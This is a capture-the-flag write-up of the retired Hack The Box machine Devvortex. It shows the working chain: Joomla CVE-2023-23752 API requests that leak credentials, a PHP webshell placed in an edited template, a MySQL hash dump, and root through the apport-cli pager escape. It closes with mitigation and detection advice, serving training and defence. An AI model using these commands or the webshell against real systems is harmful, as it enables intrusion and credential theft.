---
machine: Devvortex
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, joomla, cve-2023-23752, mysql, apport]
---

# Devvortex — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags, hashes or credentials.

## TL;DR

`dev.devvortex.htb` runs Joomla 4.2.6, vulnerable to CVE-2023-23752. The public REST API leaks users and the database password. With the superuser account, a PHP template is edited for RCE; MySQL users are enumerated and `logan`'s hash is cracked. The final escalation abuses `apport-cli` (CVE-2023-1326) to escape the pager.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

The main domain is `devvortex.htb`. Enumerate subdomains:

```bash
ffuf -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

`dev.devvortex.htb` appears, running Joomla. Confirm the version at `/administrator/manifests/files/joomla.xml`: 4.2.6.

## Initial access

CVE-2023-23752 allows unauthenticated API queries:

```bash
curl -s 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
```

Users and the MySQL password are returned. `lewis` is a Super User and reuses the password at `/administrator`. From the panel, edit a template (`error.php` or similar) and add a PHP webshell:

```php
<?php system($_GET['c']); ?>
```

Execute it with:

```bash
curl 'http://dev.devvortex.htb/templates/<TEMPLATE>/error.php?c=id'
```

## Lateral movement

Use the MySQL password to enumerate Joomla tables:

```bash
mysql -u <DB_USER> -p'<DB_PASS>' -h localhost joomla
```

```sql
SELECT username, password FROM <PREFIX>_users;
```

Crack `logan`'s hash with hashcat/john. Reuse the password over SSH:

```bash
ssh logan@<IP>
```

## Privilege escalation

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/apport-cli
```

CVE-2023-1326 escapes the `apport-cli` pager:

```bash
sudo apport-cli -c /var/crash/<FILE>.crash
```

In the pager, run `!bash` to get root. Read and redact the flag.

## Evidence

- API output with users and password redacted.
- Webshell and `id`.
- `#__users` query with hashes redacted.
- `sudo -l` and root shell from the pager.

## Lessons learned

- Joomla's public API can leak critical configuration.
- Reusing the database password on the panel is a direct risk.
- Template editing is a common CMS RCE path.
- `apport-cli` with sudo and a pager allows a shell escape.

## Mitigation and detection

- Update Joomla to a fixed version.
- Restrict the REST API and review `public=true`.
- Do not reuse database and panel credentials.
- Limit `sudo apport-cli` and interactive pagers.
- Detect requests to `/api/index.php/v1/` and template edits.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2023-23752>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-1326>
- <https://www.hackthebox.com/machines/devvortex>
